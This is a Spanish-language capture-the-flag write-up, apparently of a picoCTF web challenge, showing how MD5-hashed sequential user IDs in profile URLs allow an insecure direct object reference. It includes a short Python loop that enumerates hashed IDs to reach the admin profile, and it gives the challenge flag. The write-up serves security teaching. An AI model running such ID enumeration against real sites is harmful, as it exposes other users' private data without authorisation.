# Writeup: Hashgate (IDOR via MD5 Obfuscated Numeric User IDs)

* **Categoría:** Web Exploitation
* **Plataforma:** picoCTF
* **Dificultad:** Fácil / Media
* **Flag:** `academy{id0r_unl0ck_34378399}`

---

## 1. Análisis del Reto

La aplicación presenta un portal de login.
1. Al inspeccionar el código fuente HTML se observan credenciales de invitado en un comentario:
   `<!-- Email: guest@cylabacademy.org Password: guest -->`
2. Al iniciar sesión, la aplicación redirige a una URL de perfil:
   `/profile/user/e93028bdc1aacdfb3687181f2031765d`
   Mostrando el mensaje:
   `Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.`

Pistas:
* *Notice anything about how the ID is being checked? It’s not plain text… maybe a one-way function is involved.*
* *There are about 20 employees in this organisation.*

## 2. Vulnerabilidad

1. **Security through Obscurity:** El identificador en la URL no es un token de sesión seguro, sino simplemente el hash MD5 del ID numérico secuencial del usuario:
   $$\text{MD5}(3000) = \text{e93028bdc1aacdfb3687181f2031765d}$$
2. **Insecure Direct Object Reference (IDOR):** No existe control de acceso para verificar si el usuario autenticado tiene permisos para ver los perfiles de otros empleados.

## 3. Explotación (Solver)

Script implementado en [solve_hashgate.py](file:///c:/Users/rpulg/OneDrive/Escritorio/ctf/challenges/13_employee_id_hash/solve_hashgate.py):
Iteramos sobre los IDs de empleados en el rango de los 20 trabajadores de la empresa ($3000 \dots 3020$) calculando su hash MD5 y realizando peticiones GET:

```python
for emp_id in range(3000, 3021):
    h = hashlib.md5(str(emp_id).encode()).hexdigest()
    r = requests.get(f"{BASE_URL}/profile/user/{h}")
    if "academy{" in r.text:
        print(r.text)
```

En el ID `3016` ($\text{MD5} = \text{53a1320cb5d2f56130ad5222f93da374}$):
`Welcome, admin! Here is the flag: academy{id0r_unl0ck_34378399}`

## 4. Resultado

```text
[+] ID 3016 (MD5: 53a1320cb5d2f56130ad5222f93da374)
[+] FLAG: academy{id0r_unl0ck_34378399}
```
